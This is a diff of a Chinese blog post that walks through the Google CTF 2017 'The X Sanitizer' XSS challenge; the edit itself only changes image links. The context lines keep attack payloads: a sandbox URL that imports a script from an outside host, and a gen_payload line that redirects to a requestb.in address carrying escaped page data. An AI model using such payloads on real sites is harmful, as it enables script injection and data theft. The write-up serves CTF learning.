@@ -19,7 +19,7 @@ tags:
 
 在今年的Google CTF 2017中，有这样的一道题目The X Sanitizer，大概长这个样子，
 
-![The X Sanitizer.png](http://ac-cf2bfs1v.clouddn.com/d9820c46c06f75f57265.png)
+![The X Sanitizer.png](http://lc-cf2bfs1v.cn-n1.lcfile.com/d9820c46c06f75f57265.png)
 
 我复现了这个[**环境**](https://bindog.github.io/txs/the_x_sanitizer.html)，感兴趣的同学可以自己来试试，看看能否弹窗~(注意路径哦，和本文后面的解答略有不同)
 
@@ -171,7 +171,7 @@ with(document) remove(document === currentScript.ownerDocument ? currentScript :
 
 将上述过程画成一张图，看起来条理更清楚一点
 
-![code_logic.png](http://ac-cf2bfs1v.clouddn.com/97ae611a459c1f173f53.png)
+![code_logic.png](http://lc-cf2bfs1v.cn-n1.lcfile.com/97ae611a459c1f173f53.png)
 
 可以看到整个过程中所有的请求都是由Service worker响应的，所以想引入外部的恶意脚本几乎是不可能的。搞清楚代码的逻辑之后，我们可以着手构造payload了，其实核心问题就两个
 
@@ -202,17 +202,17 @@ with(document) remove(document === currentScript.ownerDocument ? currentScript :
 
 这样脚本中重复定义了`remove`，执行时会报错`remove`不是一个函数，最后并没有执行，从而保留住了link标签
 
-![dom_clobbering.png](http://ac-cf2bfs1v.clouddn.com/289ea9f52dbafecf6aae.png)
+![dom_clobbering.png](http://lc-cf2bfs1v.cn-n1.lcfile.com/289ea9f52dbafecf6aae.png)
 
 这样第一个问题解决了，我们将该payload输入到文本框，点击按钮，这时注意看console中的错误信息，由于违反了主页中的CSP策略，我们的脚本是无法加载的。
 
-![csp.png](http://ac-cf2bfs1v.clouddn.com/9ae8ec7eee050083923c.png)
+![csp.png](http://lc-cf2bfs1v.cn-n1.lcfile.com/9ae8ec7eee050083923c.png)
 
 ## 0x03 搞定CSP
 
 如何解决这第二个问题呢？既然主页的CSP策略非常严格，我们只能从其同源的页面入手，而同源的页面且受我们控制的只有下面这个请求了：
 
-![sandbox_request.png](http://ac-cf2bfs1v.clouddn.com/0bad02f853411f08b64a.png)
+![sandbox_request.png](http://lc-cf2bfs1v.cn-n1.lcfile.com/0bad02f853411f08b64a.png)
 
 ```js
 https://sanitizer.web.ctfcompetition.com/sandbox?html=%3Clink%20rel%3D%22import%22%3E%3Clink%20rel%3D%22import%22%20href%3D%22https%3A%2F%2Fheiheihei.com%2Fpwn.html%22%3E
@@ -238,7 +238,7 @@ https://sanitizer.web.ctfcompetition.com/sandbox?html=%3Clink%20rel%3D%22import%
 
 很遗憾，虽然我们成功的插入了`script`元素，但是由于CSP策略限制，`inline`形式的脚本是无法执行的
 
-![inline_script.png](http://ac-cf2bfs1v.clouddn.com/566a403f55f1b79e4f2a.png)
+![inline_script.png](http://lc-cf2bfs1v.cn-n1.lcfile.com/566a403f55f1b79e4f2a.png)
 
 不过我们稍微修改一下payload，以`src`形式加载一个可控脚本进来即可绕过，无非是多请求一次而已，如下
 
@@ -251,7 +251,7 @@ https://sanitizer.web.ctfcompetition.com/sandbox?html=%3Clink%20rel%3D%22import%
 
 再来看看结果
 
-![invalid_js.png](http://ac-cf2bfs1v.clouddn.com/f16c4efe55c7fc9daafc.png)
+![invalid_js.png](http://lc-cf2bfs1v.cn-n1.lcfile.com/f16c4efe55c7fc9daafc.png)
 
 依然不行，以`src`形式加载脚本的话，响应并非一个有效的脚本文件，前面被强行插入了`<!doctype HTML>`等代码片段，报了语法错误
 
@@ -373,7 +373,7 @@ y>	\u3e79	㹹
 
 再次提交我们的结果，此时成功的弹窗，观察最后那个关键的请求
 
-![utf-16be.png](http://ac-cf2bfs1v.clouddn.com/ab9f93794817e11f7710.png)
+![utf-16be.png](http://lc-cf2bfs1v.cn-n1.lcfile.com/ab9f93794817e11f7710.png)
 
 从图中可以看到，由于我们指定了编码，因此前面那些被附加上的内容全部按`utf-16be`编码进行解析，和我们刚才分析的结果一致，在脚本中可以将其视为一个变量名，我们将该语句补充完整，然后即可执行我们附加的代码
 
@@ -407,7 +407,7 @@ gen_payload('=1; location.href="https://requestb.in/1447b711?inspect?" + escape(
 
 提交之后等待结果，最后接收到`flag`
 
-![flag.png](http://ac-cf2bfs1v.clouddn.com/425ce1dece8a618bf833.png)
+![flag.png](http://lc-cf2bfs1v.cn-n1.lcfile.com/425ce1dece8a618bf833.png)
 
 收工~
 
